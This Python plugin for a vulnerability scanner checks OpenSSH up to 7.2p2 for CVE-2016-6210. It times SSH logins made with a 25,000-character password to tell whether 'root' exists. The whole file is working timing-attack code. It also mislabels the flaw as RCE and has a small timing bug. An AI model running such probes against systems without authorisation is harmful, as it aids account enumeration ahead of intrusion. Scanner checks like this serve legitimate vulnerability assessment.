# coding:utf-8
import paramiko
import time
import random
import urllib.parse
import socket

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = "OpenSSH_0101"  # 平台漏洞编号
    name = "OpenSSH畸形长度密码枚举系统用户"  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ""  # 漏洞公布时间
    desc = """
    当我们使用不存在的用户名去连接ssh服务器时，SSHD会基于BLOWFISH算法去生成一个假的密码，但如果使用存在的用户名，
    SSHD会使用SHA256/SHA512算法对密码进行加密。所以我们发送一个超大密码（>10KB），
    SHA256算法计算时间就远长于BLOWFISH算法的假密码。所以基于这个原理，我们可以枚举ssh用户名。
    """  # 漏洞描述
    ref = "https://_thorns.gitbooks.io/sec/content/opensshji_xing_chang_du_mi_ma_mei_ju_xi_tong_yong_.html"  # 漏洞来源
    cnvd_id = "Unknown"  # cnvd漏洞编号
    cve_id = "CVE-2016-6210"  # cve编号
    product = "OpenSSH"  # 漏洞组件名称
    product_version = "<= 7.2p2"  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = "4d2b0667-9b68-4d82-bb93-329225d8cb9b"  # 平台 POC 编号
    author = "hyhmnn"  # POC编写者
    create_date = "2018-06-08"  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def getSshConnTime(self, ip, user, password):
        ssh = paramiko.SSHClient()
        starttime = time.time()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=user, password=password)
        except:
            endtime = time.time()
        return endtime - starttime

    def verify(self):
        self.target = (
            self.target.rstrip("/") + "/" +
            (self.get_option("base_path").lstrip("/"))
        )
        try:
            ip = socket.gethostbyname(self.target_host)
            user = "".join([chr(random.randint(97, 123)) for _i in range(10)])
            p = "A" * 25000
            if self.getSshConnTime(ip, "root", p) > self.getSshConnTime(ip, user, p):
                self.output.report(
                    self.vuln,
                    "发现{target}存在{name}漏洞".format(
                        target=self.target, name=self.vuln.name
                    ),
                )
        except Exception as e:
            self.output.info("执行异常：{}".format(e))

    def exploit(self):
        self.verify()


if __name__ == "__main__":
    Poc().run()
